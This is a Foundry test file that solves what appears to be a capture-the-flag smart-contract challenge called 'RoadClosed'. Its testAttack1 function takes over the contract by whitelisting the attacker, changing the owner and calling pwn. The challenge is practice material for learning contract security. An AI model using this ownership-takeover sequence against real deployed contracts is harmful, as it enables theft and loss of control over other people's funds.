// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.7;

import "../src/1-RoadClosed/roadclosed.sol";
import "forge-std/Test.sol";

contract RoadClosedTest is Test {
    RoadClosed challenge;

    address public deployer;
    address public pwner;

    function setUp() public {
        vm.startPrank(deployer);
        challenge = new RoadClosed();
        vm.stopPrank();
        pwner = makeAddr("0xdeadbeef");
    }

    function testOwner() public {
        vm.startPrank(deployer);
        assertEq(challenge.isOwner(), true);
    }

    function testStatus() public {
        vm.startPrank(pwner);
        assertEq(challenge.isHacked(), false);
    }

    function testAttack1() public {
        vm.startPrank(pwner);
        challenge.addToWhitelist(pwner);
        challenge.changeOwner(pwner);
        challenge.pwn(pwner);
        assertEq(challenge.isHacked(), true);
    }
}
